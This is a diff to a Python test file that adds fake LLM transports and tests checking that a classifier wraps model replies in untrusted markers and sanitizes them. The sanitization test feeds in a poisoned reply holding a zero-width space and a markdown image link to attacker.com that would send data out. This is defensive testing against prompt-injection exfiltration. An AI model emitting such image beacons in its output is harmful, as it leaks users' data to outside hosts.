@@ -126,6 +126,37 @@ class FakeTransport:
         self.chat = FakeChat(responses)
 
 
+class RecordingCompletions:
+    def __init__(self, responses: list[str]) -> None:
+        self._responses = responses
+        self._i = 0
+        self.messages: list[Any] = []
+
+    async def create(self, **kwargs):
+        self.messages.append(kwargs.get("messages", []))
+        content = self._responses[self._i % len(self._responses)]
+        self._i += 1
+        return FakeResponse(content)
+
+
+class RecordingChat:
+    def __init__(self, responses: list[str]) -> None:
+        self.completions = RecordingCompletions(responses)
+
+
+class RecordingTransport:
+    def __init__(self, responses: list[str]) -> None:
+        self.chat = RecordingChat(responses)
+
+    def user_contents(self) -> list[str]:
+        return [
+            msg["content"]
+            for messages in self.chat.completions.messages
+            for msg in messages
+            if msg["role"] == "user"
+        ]
+
+
 @pytest.fixture
 def config() -> LocusConfig:
     return LocusConfig(_env_file=None)
@@ -208,3 +239,32 @@ async def test_classifier_clamps_score_and_coerces_leaks(config: LocusConfig) ->
     )
     assert result.score == 10
     assert result.leaks == ["one leak"]
+
+
+async def test_classifier_wraps_reply_in_untrusted_marker(config: LocusConfig) -> None:
+    transport = RecordingTransport(['{"pattern": "yes", "boolean": true, "score": 8, "leaks": []}'])
+    llm = LLMClient(config, transport=transport)
+    clf = Classifier(llm, config)
+    await clf.classify(
+        Probe(session_id="s", property_key="word_count", text="probe?"),
+        "yes",
+    )
+    users = transport.user_contents()
+    assert len(users) == 1
+    assert "<UNTRUSTED_REPLY_" in users[0]
+    assert "</UNTRUSTED_REPLY_" in users[0]
+
+
+async def test_classifier_sanitizes_reply_before_prompt(config: LocusConfig) -> None:
+    transport = RecordingTransport(['{"pattern": "yes", "boolean": true, "score": 8, "leaks": []}'])
+    llm = LLMClient(config, transport=transport)
+    clf = Classifier(llm, config)
+    poisoned = "yes\u200b ![tracking](https://attacker.com/collect?d=S)"
+    await clf.classify(
+        Probe(session_id="s", property_key="word_count", text="probe?"),
+        poisoned,
+    )
+    users = transport.user_contents()
+    assert "\u200b" not in users[0]
+    assert "![tracking](https://attacker.com/collect?d=S)" not in users[0]
+    assert "[image]" in users[0]
